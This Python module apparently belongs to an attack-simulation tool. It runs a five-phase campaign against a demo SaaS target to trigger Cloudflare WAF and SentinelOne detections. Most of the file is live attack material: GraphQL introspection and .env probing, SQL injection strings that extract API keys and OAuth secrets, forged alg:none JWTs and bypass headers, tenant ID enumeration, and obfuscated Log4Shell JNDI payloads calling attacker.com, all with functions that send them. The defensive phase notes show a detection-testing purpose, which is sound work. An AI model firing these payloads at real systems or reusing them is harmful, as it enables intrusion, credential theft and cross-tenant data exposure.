"""
campaigns/saas.py — Operation Tenant Escape
5-phase attack chain. CloudMatrix target: acmecorp-api + acmecorp-shop.

MITRE ATT&CK mapping
--------------------
Phase 1 — T1595.002 Active Scanning: Vulnerability Scanning
           + T1592.002 Gather Victim Network Info (GraphQL introspection)
Phase 2 — T1552.001 Unsecured Credentials: Credentials In Files
           + T1212 Exploitation for Credential Access (API key endpoints)
Phase 3 — T1548 Abuse Elevation Control Mechanism
           + T1550.001 Use Alternate Authentication Material: JWT forgery
Phase 4 — T1078 Valid Accounts: Tenant IDOR + T1190 SQLi on billing
Phase 5 — T1190 Exploit Public-Facing Application (Log4Shell CVE-2021-44228)

Cloudflare log signal: WAF HTTP events (WAFSQLiAttackScore, BotScore,
  SecurityRuleDescription, ClientRequestPath /graphql, /api/v1/admin)
SentinelOne: PowerQuery on rawLogLine; correlate GraphQL introspection events
  with subsequent admin endpoint probing (same ClientIP, 5-minute window).
"""

import random

from .engine import send_request, log_phase_event, sleep_between_requests

# ---------------------------------------------------------------------------
# Payloads — ported from cf-attack-sim-v2/attacks/payloads/saas.py
# ---------------------------------------------------------------------------

# Recon paths: CloudMatrix routes first, then SaaS-specific paths.
RECON_PATHS = [
    # CloudMatrix real routes (acmecorp-api)
    "/api/v1/admin",
    "/api/v1/users",
    "/api/v1/training-data",
    "/api/v1/models",
    "/api/v1/billing",
    "/api/v1/health",
    # CloudMatrix real routes (acmecorp-shop)
    "/search",
    "/login",
    # SaaS-specific (yields WAF/bot signal even without worker route)
    "/api/docs", "/swagger", "/swagger.json", "/openapi.json",
    "/api/v1", "/api/v2",
    "/.env", "/.env.production", "/.env.local", "/.env.backup",
    "/api/v1/tenants", "/api/v1/config", "/api/keys",
    "/admin", "/admin/impersonate",
    "/oauth/token", "/oauth/.well-known/openid-configuration",
    "/graphql",
]

GRAPHQL_INTROSPECTION = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__schema{queryType{name}mutationType{name}}}"}',
    '{"query":"{__type(name:\\"User\\"){fields{name type{name}}}}"}',
    '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}',
]

SCANNER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "python-requests/2.28.0",
    "Go-http-client/1.1",
    "APIScanner/2.0 (custom)",
    "zgrab/0.x",
    "GraphQLmap/1.0",
    "WFuzz/3.1.0",
]

TENANT_IDS = list(range(2001, 2051))

API_SQLI = [
    "' OR 1=1--",
    "include=' OR 1=1--",
    "tenant=' UNION SELECT * FROM tenants--",
    "1 UNION SELECT api_key,secret,tenant_id FROM api_credentials--",
    "' OR EXISTS(SELECT * FROM tenants WHERE tier='enterprise')--",
    "1; SELECT * FROM oauth_tokens--",
    "' UNION SELECT null,client_secret,access_token FROM oauth_clients--",
    "tenant_id=' UNION SELECT * FROM billing--",
]

ADMIN_PAYLOADS = [
    {"role": "admin", "tenant_id": "1", "impersonate": "true"},
    {"role": "superadmin", "user_id": "1", "bypass": "true"},
    {"scope": "admin:all", "grant_type": "client_credentials"},
]

JWT_FORGERY_HEADERS = [
    {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."},
    {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwidGVuYW50IjoiZ2xvYmFsIn0.forged"},
    {"X-Internal-Token": "internal-bypass-token-2024"},
    {"X-Admin-Override": "true", "X-Tenant-ID": "0"},
]

LOG4SHELL_SAAS = [
    {
        "ua": "${jndi:ldap://attacker.com/saas-exploit}",
        "x_request_id": "${jndi:ldap://attacker.com/saas-exploit}",
        "x_forwarded_host": "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
    },
    {
        "ua": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/Exploit}",
        "x_request_id": "${jndi:rmi://attacker.com:1099/saas-rce}",
        "x_forwarded_host": "${jndi:dns://attacker.com/saas-backend}",
    },
    {
        "ua": "${jndi:ldap://192.168.1.1:1389/SaaSExploit}",
        "x_request_id": "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/tenant-escape}",
        "x_forwarded_host": "${jndi:ldap://attacker.com/java-backend}",
    },
]


# ---------------------------------------------------------------------------
# Phase functions
# ---------------------------------------------------------------------------

def fire_phase_1_one(target, log_buffer, log_counter, stop_flag):
    """T1595.002 + T1592 — GraphQL introspection and API surface enumeration."""
    if random.random() < 0.4:
        query = random.choice(GRAPHQL_INTROSPECTION)
        send_request(
            url=f"{target}/graphql",
            method="POST",
            data=query,
            headers={
                "Content-Type": "application/json",
                "User-Agent": random.choice(SCANNER_AGENTS),
            },
            label="GraphQL Introspection → schema enumeration",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=1, industry="saas",
        )
    else:
        path = random.choice(RECON_PATHS)
        agent = random.choice(SCANNER_AGENTS)
        send_request(
            url=f"{target}{path}",
            headers={"User-Agent": agent},
            label=f"API Recon → {path}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=1, industry="saas",
        )


def fire_phase_1_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 1: API Surface Reconnaissance — GraphQL introspection, OpenAPI probing, .env discovery",
        1, "saas", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_1_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_2_one(target, log_buffer, log_counter, stop_flag):
    """T1552.001 + T1212 — API key endpoint probing and JWT manipulation."""
    endpoint = random.choice(["/api/v1/admin", "/api/v1/config", "/api/v1/users"])
    if endpoint == "/api/v1/users" and random.random() < 0.5:
        payload = random.choice(API_SQLI)
        send_request(
            url=f"{target}{endpoint}",
            params={"include": payload},
            label=f"API Key Theft → SQLi {payload[:50]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="saas",
        )
    else:
        extra_headers = random.choice(JWT_FORGERY_HEADERS) if random.random() < 0.4 else {}
        send_request(
            url=f"{target}{endpoint}",
            headers=extra_headers,
            label=f"API Key Extraction → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="saas",
        )


def fire_phase_2_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 2: API Key Extraction — probing /api/v1/admin, /api/v1/config, JWT header injection",
        2, "saas", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_2_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_3_one(target, log_buffer, log_counter, stop_flag):
    """T1548 + T1550.001 — admin endpoint probing, JWT forgery, OAuth abuse."""
    endpoint = random.choice(["/api/v1/admin", "/admin/impersonate", "/oauth/token"])
    if endpoint == "/oauth/token":
        payload = random.choice(ADMIN_PAYLOADS)
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data=payload,
            label="OAuth Abuse → client_credentials grant escalation",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=3, industry="saas",
        )
    else:
        jwt_header = random.choice(JWT_FORGERY_HEADERS)
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={"role": "admin", "bypass": "true"},
            headers=jwt_header,
            label=f"Privilege Escalation → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=3, industry="saas",
        )


def fire_phase_3_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 3: Privilege Escalation — admin endpoint probing, JWT forgery, OAuth abuse",
        3, "saas", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_3_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_4_one(target, log_buffer, log_counter, stop_flag):
    """T1078 + T1190 — tenant IDOR enumeration and SQLi on billing."""
    tenant_id = random.choice(TENANT_IDS)
    if random.random() < 0.4:
        payload = random.choice(API_SQLI)
        send_request(
            url=f"{target}/api/v1/billing",
            params={"tenant": payload},
            label=f"Tenant SQLi → billing?tenant={payload[:50]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )
    elif random.random() < 0.5:
        send_request(
            url=f"{target}/api/v1/training-data",
            params={"tenant_id": tenant_id},
            label=f"IDOR → training-data?tenant_id={tenant_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )
    else:
        send_request(
            url=f"{target}/api/v1/users",
            params={"tenant_id": tenant_id},
            label=f"Tenant Isolation Bypass → tenant_id={tenant_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )


def fire_phase_4_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 4: Tenant Isolation Breach — sequential tenant ID enumeration, IDOR, SQLi on billing",
        4, "saas", log_buffer, log_counter,
    )
    for i in range(count):
        if stop_flag and stop_flag.is_set():
            break
        tenant_id = 2001 + (i % 50)
        send_request(
            url=f"{target}/api/v1/training-data",
            params={"tenant_id": tenant_id},
            label=f"IDOR → training-data tenant_id={tenant_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_5_one(target, log_buffer, log_counter, stop_flag):
    """T1190 — Log4Shell CVE-2021-44228 on Java backend API endpoints."""
    cve = random.choice(LOG4SHELL_SAAS)
    send_request(
        url=f"{target}/api/v1/users",
        headers={
            "User-Agent": cve["ua"],
            "X-Request-ID": cve["x_request_id"],
            "X-Forwarded-Host": cve["x_forwarded_host"],
        },
        label="Log4Shell CVE-2021-44228 → /api/v1/users",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=5, industry="saas",
    )


def fire_phase_5_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 5: Backend Infrastructure Zero-Day — Log4Shell CVE-2021-44228 on Java backend services",
        5, "saas", log_buffer, log_counter,
    )
    endpoints = ["/api/v1/users", "/api/v1/training-data", "/api/v1/admin"]
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        cve = random.choice(LOG4SHELL_SAAS)
        endpoint = random.choice(endpoints)
        send_request(
            url=f"{target}{endpoint}",
            headers={
                "User-Agent": cve["ua"],
                "X-Request-ID": cve["x_request_id"],
                "X-Forwarded-Host": cve["x_forwarded_host"],
            },
            label=f"Log4Shell CVE-2021-44228 → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=5, industry="saas",
        )
        sleep_between_requests(custom_range=delay_range)


# ---------------------------------------------------------------------------
# PHASES manifest
# ---------------------------------------------------------------------------

PHASES = [
    {
        "number": 1,
        "name": "API Surface Reconnaissance",
        "description": (
            "Attacker enumerating all API endpoints, GraphQL schema, and OAuth "
            "configuration on CloudMatrix platform."
        ),
        "mitre_technique": "T1595.002 — Active Scanning: Vulnerability Scanning + T1592 Gather Victim Host Info",
        "target_route": "acmecorp-api /api/v1/*, acmecorp-shop /graphql (recon signal)",
        "what_fires": (
            "GraphQL introspection query {__schema}, OpenAPI/Swagger probing, "
            ".env discovery, /api/docs enumeration. Bot score: 5/100."
        ),
        "cloudflare_story": (
            "GraphQL introspection detected + sensitive file probing (.env, swagger.json). "
            "Bot score: 5/100."
        ),
        "sentinelone_story": (
            "Systematic API enumeration. Attacker building complete picture of platform surface. "
            "Targeted, not opportunistic."
        ),
        "hyperautomation": (
            "GraphQL introspection + env file probing → Block IP, disable GraphQL introspection, "
            "alert platform security"
        ),
        "fire_one":  fire_phase_1_one,
        "fire_many": fire_phase_1_many,
    },
    {
        "number": 2,
        "name": "API Key Extraction",
        "description": (
            "Attacker attempting to extract API keys through misconfiguration "
            "and injection attacks on CloudMatrix API."
        ),
        "mitre_technique": "T1552.001 — Unsecured Credentials: Credentials In Files + T1212 Credential Access Exploit",
        "target_route": "acmecorp-api /api/v1/admin, /api/v1/users",
        "what_fires": (
            "GET /api/v1/admin, GET /api/v1/config, SQLi on /api/v1/users?include=, "
            "X-Internal-Token header probing. Multiple 403s."
        ),
        "cloudflare_story": (
            "API key endpoint probing + config endpoint access attempts. "
            "Multiple 403s. JWT manipulation detected."
        ),
        "sentinelone_story": (
            "Attacker specifically targeting API key management endpoints. "
            "Matches known SaaS attack playbook in threat intel."
        ),
        "hyperautomation": (
            "API key endpoint probing → Rotate all API keys for affected tenant, "
            "notify account owners, flag for review"
        ),
        "fire_one":  fire_phase_2_one,
        "fire_many": fire_phase_2_many,
    },
    {
        "number": 3,
        "name": "Privilege Escalation Attempt",
        "description": (
            "Attacker attempting to escalate to admin role and access tenant "
            "management endpoints."
        ),
        "mitre_technique": "T1548 — Abuse Elevation Control Mechanism + T1550.001 Use Alternate Authentication Material",
        "target_route": "acmecorp-api /api/v1/admin, /oauth/token",
        "what_fires": (
            "POST /api/v1/admin with role manipulation, /admin/impersonate probing, "
            "JWT token forgery (alg:none), OAuth abuse."
        ),
        "cloudflare_story": (
            "Multiple 403s on admin endpoints. OAuth client_credentials grant abuse "
            "pattern detected."
        ),
        "sentinelone_story": (
            "Escalation attempt following successful API enumeration. "
            "Same threat actor — Phase 3 of coordinated attack confirmed by AI."
        ),
        "hyperautomation": (
            "Admin endpoint probing + OAuth abuse → Lock admin API, "
            "revoke suspicious OAuth tokens, alert IAM team"
        ),
        "fire_one":  fire_phase_3_one,
        "fire_many": fire_phase_3_many,
    },
    {
        "number": 4,
        "name": "Tenant Isolation Breach Attempt",
        "description": (
            "Attacker attempting to access data from other tenants by manipulating "
            "tenant IDs on CloudMatrix training-data and billing."
        ),
        "mitre_technique": "T1078 — Valid Accounts: Cloud Accounts + T1190 Exploit Public-Facing Application (SQLi/IDOR)",
        "target_route": "acmecorp-api /api/v1/training-data, /api/v1/billing",
        "what_fires": (
            "Sequential GET /api/v1/training-data?tenant_id=2001→2050, IDOR via tenant_id param, "
            "SQLi on /api/v1/billing?tenant=. WAFSQLiAttackScore: 96."
        ),
        "cloudflare_story": (
            "Sequential tenant ID access + SQLi on billing endpoint. "
            "WAFSQLiAttackScore: 96. IDOR pattern flagged."
        ),
        "sentinelone_story": (
            "Tenant isolation attack. If successful — full access to all customer data. "
            "Escalated to highest severity by AI."
        ),
        "hyperautomation": (
            "IDOR pattern + SQLi on tenant data → Critical incident, "
            "isolate affected tenant APIs, notify all impacted customers"
        ),
        "fire_one":  fire_phase_4_one,
        "fire_many": fire_phase_4_many,
    },
    {
        "number": 5,
        "name": "Backend Infrastructure Zero-Day",
        "description": (
            "Log4Shell exploit targeting Java-based backend services for complete "
            "infrastructure compromise."
        ),
        "mitre_technique": "T1190 — Exploit Public-Facing Application (Log4Shell CVE-2021-44228)",
        "target_route": "acmecorp-api /api/v1/users, /api/v1/training-data, /api/v1/admin",
        "what_fires": (
            "CVE-2021-44228 in User-Agent, X-Request-ID, X-Forwarded-Host headers "
            "on Java backend endpoints."
        ),
        "cloudflare_story": (
            "Log4Shell CVE-2021-44228 blocked. FirewallForAIInjectionScore: 100. "
            "WAFRCEAttackScore: 99."
        ),
        "sentinelone_story": (
            "Full 5-phase campaign concluded. Nation-state tooling on SaaS backend. "
            "Complete attack chain correlated into single Critical incident by AI."
        ),
        "hyperautomation": (
            "Log4Shell + Critical → Isolate Java services, push emergency WAF rule to Cloudflare, "
            "page CTO + CISO, open customer breach notification workflow"
        ),
        "fire_one":  fire_phase_5_one,
        "fire_many": fire_phase_5_many,
    },
]
